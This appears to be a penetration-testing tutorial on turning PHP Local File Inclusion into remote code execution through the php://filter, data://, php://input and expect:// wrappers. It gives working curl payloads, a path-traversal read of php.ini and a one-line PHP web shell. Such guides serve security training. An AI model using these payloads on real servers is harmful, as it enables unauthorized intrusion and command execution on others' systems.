# PHP Wrappers

We can leverage PHP wrappers to execute code on back-end servers through Local File Inclusion (LFI) vulnerabilities. By utilizing various PHP wrappers, we can gain control over the server and potentially execute commands remotely.

***

### 🔍 Checking PHP Configurations

#### Verifying `allow_url_include`

Before using certain PHP wrappers, it's essential to check if the `allow_url_include` setting is enabled in the PHP configuration. This setting allows the inclusion of external data, which is crucial for executing remote code. The configuration file is found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version

To check this, we can attempt to read the PHP configuration file using the base64 filter:

{% code overflow="wrap" %}
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini"
```
{% endcode %}

After obtaining the base64 encoded string, decode it and search for the `allow_url_include` setting:

{% code overflow="wrap" %}
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
{% endcode %}

If the output shows `allow_url_include = On`, we can proceed with our attacks.

***

### 🚀 Remote Code Execution with PHP Wrappers

#### Using the Data Wrapper

With `allow_url_include` enabled, we can use the **data wrapper** to include and execute PHP code. The data wrapper allows us to pass base64 encoded strings, which can be decoded and executed by the server.

1.  **Create a PHP Web Shell**:

    ```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64
    ```

    This will output a base64 encoded string of the PHP code.
2.  **Execute Commands**: Use the encoded string in a URL:

    {% code overflow="wrap" %}
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_STRING>&cmd=id
    ```
    {% endcode %}

    Alternatively, using cURL:

    {% code overflow="wrap" %}
    ```bash
    curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_STRING>&cmd=id' | grep uid
    ```
    {% endcode %}

#### Using the Input Wrapper

The **input wrapper** functions similarly to the data wrapper but requires a POST request to include the PHP code.

1.  **Send a POST Request**:

    {% code overflow="wrap" %}
    ```bash
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    ```
    {% endcode %}

    Ensure that the vulnerable function can accept GET requests to pass commands dynamically.

#### Using the Expect Wrapper

The **expect wrapper** allows direct command execution without needing to provide a web shell. This wrapper must be installed and enabled on the server.

1.  **Check for Expect Installation**:

    {% code overflow="wrap" %}
    ```bash
    echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
    ```
    {% endcode %}
2.  **Execute Commands**: If the expect module is enabled, you can run commands directly:

    ```bash
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
    ```
